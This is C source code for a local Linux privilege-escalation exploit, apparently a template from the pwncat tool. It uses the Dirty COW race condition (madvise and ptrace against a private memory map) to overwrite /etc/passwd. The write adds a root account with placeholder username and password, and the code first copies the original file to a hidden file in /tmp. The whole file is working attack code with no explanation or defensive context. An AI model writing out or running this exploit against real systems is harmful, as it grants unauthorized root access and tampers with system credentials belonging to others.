#include<fcntl.h>
#include<pthread.h>
#include<string.h>
#include<stdio.h>
#include<stdint.h>
#include<sys/mman.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<sys/wait.h>
#include<sys/ptrace.h>
#include<stdlib.h>
#include<unistd.h>
#include<crypt.h>
const char*filename="/etc/passwd";const char*backup_filename="/tmp/.pwncat";const char*salt="PWNCAT_SALT";int f;void*map;pid_t pid;pthread_t pth;struct stat st;struct Userinfo{char*username;char*hash;int user_id;int group_id;char*info;char*home_dir;char*shell;};char*generate_password_hash(char*plaintext_pw){return crypt(plaintext_pw,salt);}char*generate_passwd_line(struct Userinfo u){const char*format="%s:%s:%d:%d:%s:%s:%s\n";int size=snprintf(NULL,0,format,u.username,u.hash,u.user_id,u.group_id,u.info,u.home_dir,u.shell);char*ret=malloc(size+1);sprintf(ret,format,u.username,u.hash,u.user_id,u.group_id,u.info,u.home_dir,u.shell);return ret;}void*madviseThread(void*arg){int i,c=0;for(i=0;i<200000000;i++){c+=madvise(map,100,MADV_DONTNEED);}}int copy_file(const char*from,const char*to){if(access(to,F_OK)!=-1){return-1;}char ch;FILE*source,*target;source=fopen(from,"r");if(source==NULL){return-1;}target=fopen(to,"w");if(target==NULL){fclose(source);return-1;}while((ch=fgetc(source))!=EOF){fputc(ch,target);}fclose(source);fclose(target);return 0;}int main(int argc,char*argv[]){int ret=copy_file(filename,backup_filename);if(ret!=0){exit(ret);}struct Userinfo user;user.username="PWNCAT_USER";user.user_id=0;user.group_id=0;user.info="pwned";user.home_dir="/root";user.shell="/bin/bash";char*plaintext_pw;plaintext_pw="PWNCAT_PASS";user.hash=generate_password_hash(plaintext_pw);char*complete_passwd_line=generate_passwd_line(user);f=open(filename,O_RDONLY);fstat(f,&st);map=mmap(NULL,st.st_size+sizeof(long),PROT_READ,MAP_PRIVATE,f,0);pid=fork();if(pid){waitpid(pid,NULL,0);int u,i,o,c=0;int l=strlen(complete_passwd_line);for(i=0;i<10000/l;i++){for(o=0;o<l;o++){for(u=0;u<10000;u++){c+=ptrace(PTRACE_POKETEXT,pid,map+o,*((long*)(complete_passwd_line+o)));}}}}else{pthread_create(&pth,NULL,madviseThread,NULL);ptrace(PTRACE_TRACEME);kill(getpid(),SIGSTOP);pthread_join(pth,NULL);}return 0;}